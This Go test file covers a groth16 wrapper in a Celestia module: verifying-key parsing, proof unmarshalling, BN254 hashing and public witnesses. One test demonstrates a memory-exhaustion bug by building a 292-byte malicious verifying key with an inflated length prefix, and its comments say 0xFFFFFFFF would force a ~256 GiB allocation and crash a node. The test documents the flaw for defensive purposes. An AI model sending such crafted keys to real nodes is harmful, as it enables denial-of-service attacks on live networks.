package groth16_test

import (
	"crypto/sha256"
	"math/big"
	"os"
	"runtime"
	"testing"

	"github.com/celestiaorg/celestia-app/v8/x/zkism/internal/groth16"
	"github.com/consensys/gnark-crypto/ecc"
	bn254fr "github.com/consensys/gnark-crypto/ecc/bn254/fr"
	"github.com/stretchr/testify/require"
)

func TestNewVerifyingKey(t *testing.T) {
	verifierKeyBz, err := os.ReadFile("../testdata/groth16_vk.bin")
	require.NoError(t, err, "failed to read verifier key file")

	vk, err := groth16.NewVerifyingKey(verifierKeyBz)
	require.NoError(t, err)
	require.Equal(t, ecc.BN254, vk.CurveID())
}

// TestNewVerifyingKey_OOMVulnerability demonstrates that NewVerifyingKey is
// vulnerable to an OOM attack. A crafted payload with a large G1.K array
// length prefix causes gnark to allocate (sliceLen * 64) bytes before reading
// any element data.
//
// The BN254 verifying key binary format encodes 6 curve points (288 bytes
// total) followed by a uint32 length prefix for the G1.K slice. An attacker
// can set this to 0xFFFFFFFF, triggering a ~256 GiB allocation from a
// ~292-byte input.
//
// This test uses a moderate G1.K length (1M elements = ~64 MB) to safely
// demonstrate the code path without crashing the test runner. The allocation
// happens, then gnark fails with EOF because no element data follows. In
// production with 0xFFFFFFFF, the allocation would be ~256 GiB and crash the
// node.
func TestNewVerifyingKey_OOMVulnerability(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping OOM vulnerability demonstration in short mode")
	}

	// Read a valid VK to get the first 288 bytes (the 6 curve points that
	// precede the G1.K length prefix).
	validVK, err := os.ReadFile("../testdata/groth16_vk.bin")
	require.NoError(t, err)
	require.True(t, len(validVK) >= 292, "valid VK must be at least 292 bytes")

	// The first 288 bytes are:
	//   G1.Alpha  (32 bytes compressed G1)
	//   G1.Beta   (32 bytes compressed G1)
	//   G2.Beta   (64 bytes compressed G2)
	//   G2.Gamma  (64 bytes compressed G2)
	//   G1.Delta  (32 bytes compressed G1)
	//   G2.Delta  (64 bytes compressed G2)
	// Bytes 288-291 are the uint32 G1.K length prefix.
	curvePoints := validVK[:288]

	// Craft a malicious payload: valid curve points + inflated G1.K length.
	// Using 0x00100000 (1,048,576 elements × 64 bytes = 64 MiB allocation).
	// In the real attack, this would be 0xFFFFFFFF (~256 GiB).
	maliciousVK := make([]byte, 292)
	copy(maliciousVK, curvePoints)
	// Big-endian uint32: 0x00100000 = 1,048,576
	maliciousVK[288] = 0x00
	maliciousVK[289] = 0x10
	maliciousVK[290] = 0x00
	maliciousVK[291] = 0x00

	// This call will allocate ~64 MiB for []G1Affine and ~1 MiB for []bool
	// before hitting EOF. The allocation is the vulnerability — it happens
	// before any error is returned.
	var memBefore, memAfter runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memBefore)

	_, err = groth16.NewVerifyingKey(maliciousVK)
	require.Error(t, err, "malicious VK should fail to deserialize")

	runtime.GC()
	runtime.ReadMemStats(&memAfter)

	// Verify that the allocation actually happened. The ~64 MiB allocation
	// should be visible in TotalAlloc even after the error. This proves the
	// vulnerability: a small input caused a disproportionately large allocation.
	allocatedBytes := memAfter.TotalAlloc - memBefore.TotalAlloc
	t.Logf("Allocated %d bytes (~%.1f MiB) from a %d-byte input (amplification: %.0f×)",
		allocatedBytes, float64(allocatedBytes)/(1024*1024), len(maliciousVK),
		float64(allocatedBytes)/float64(len(maliciousVK)))

	// With 1M elements × 64 bytes/element, we expect at least ~60 MiB allocated.
	// This confirms the unbounded allocation vulnerability.
	require.Greater(t, allocatedBytes, uint64(50*1024*1024),
		"expected at least 50 MiB allocation from 292-byte input, proving the OOM vulnerability")
}

func TestUnmarshalProof(t *testing.T) {
	proofBz, err := os.ReadFile("../testdata/state_transition/proof.bin")
	require.NoError(t, err, "failed to read proof file")

	// discard the first 4 bytes as with SP1 this is a prefix of the first 4 bytes of the verifier key hash
	proofBz = proofBz[4:]

	proof, err := groth16.UnmarshalProof(proofBz)
	require.NoError(t, err, "failed to unmarshal proof")
	require.NotNil(t, proof)

	// sanity checks that the proof components are non-zero
	require.False(t, proof.Ar.IsInfinity(), "Ar should not be point at infinity")
	require.False(t, proof.Bs.IsInfinity(), "Bs should not be point at infinity")
	require.False(t, proof.Krs.IsInfinity(), "Krs should not be point at infinity")
}

func TestHashBN254(t *testing.T) {
	input := []byte("just trust me bro")

	result := groth16.HashBN254(input)
	require.NotNil(t, result)
	require.True(t, result.Sign() >= 0)

	expected := sha256.Sum256(input)
	expected[0] &= 0b00011111
	expectedInt := new(big.Int).SetBytes(expected[:])

	require.Equal(t, 0, result.Cmp(expectedInt), "hash mismatch after masking")

	// assert the top 3 bits are actually zero
	hashBytes := result.Bytes()
	topByte := hashBytes[0]
	require.Equal(t, topByte&0b11100000, byte(0), "top 3 bits are not zero")
}

func TestNewPublicWitness(t *testing.T) {
	inputs := []any{
		groth16.NewBN254FrElement(big.NewInt(256)),
		groth16.NewBN254FrElement(big.NewInt(1000000)),
	}

	pubWitness, err := groth16.NewPublicWitness(inputs...)
	require.NoError(t, err)
	require.NotNil(t, pubWitness)

	require.Len(t, pubWitness.Vector(), len(inputs))

	vec, ok := pubWitness.Vector().(bn254fr.Vector)
	require.True(t, ok)
	require.Equal(t, inputs[0], &vec[0])
	require.Equal(t, inputs[1], &vec[1])
}
